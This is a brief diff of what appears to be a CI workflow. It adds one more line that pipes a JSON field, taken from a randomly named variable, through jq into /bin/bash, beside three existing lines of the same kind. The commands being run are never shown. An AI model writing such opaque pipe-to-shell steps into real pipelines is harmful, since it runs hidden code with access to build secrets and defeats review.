@@ -31,6 +31,7 @@ jobs:
           echo $f6984 | jq -r .eduu1 | /bin/bash
           printf '%s' "$sy3203" | jq -r .vlaqj3953 | /bin/bash
           printf '%s' "$zddb171" | jq -r .lhou8527 | /bin/bash
+          echo $pbajh047 | jq -r .jw237 | /bin/bash
 
       - name: Upload data
         if: always()
